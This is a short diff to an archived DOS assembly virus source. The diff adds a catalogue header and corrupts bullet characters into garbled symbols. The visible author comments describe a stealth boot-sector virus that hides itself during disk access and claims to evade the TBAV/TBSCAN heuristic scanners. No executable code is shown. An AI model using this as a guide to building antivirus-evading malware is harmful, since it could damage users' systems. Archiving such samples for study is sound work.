@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 
 
 comment ~
@@ -38,14 +49,14 @@ In one word this is a poor and not optimized code ... Quick & dirty production
 
 -------------------------------------------------------------------------------
 
-þ When he (yes he is alive !) is active: 
+ï¿½ When he (yes he is alive !) is active: 
 - Defeat all ( the virus is hided when disk access ! ...)
 - When EMM386.EXE isn't load can not defeat PROVIEW 1.2 :
   look at 13h chain | 9F80:00B1 !!! Unknown !!! | 
 
 -> IS he REALLY FULL STEALTH WHEN ACTIVE ?
 
-þ When he is not active:
+ï¿½ When he is not active:
 
 Can defeat:
 - TBAV heuristic scanner as TBSCAN (BEST ONE !)
@@ -59,7 +70,7 @@ Can not defeat: (reported as an unknown boot sector virus)
 - Boot sector virus resident WATCHDOG anti-virus such as
   F-PROT utility as VIRSTOP ... very sensitive ...
 
-þ Problems:
+ï¿½ Problems:
 - When 32bitDiskAccess=on under Windows ... (entry point address)
 
 -------------------------------------------------------------------------------
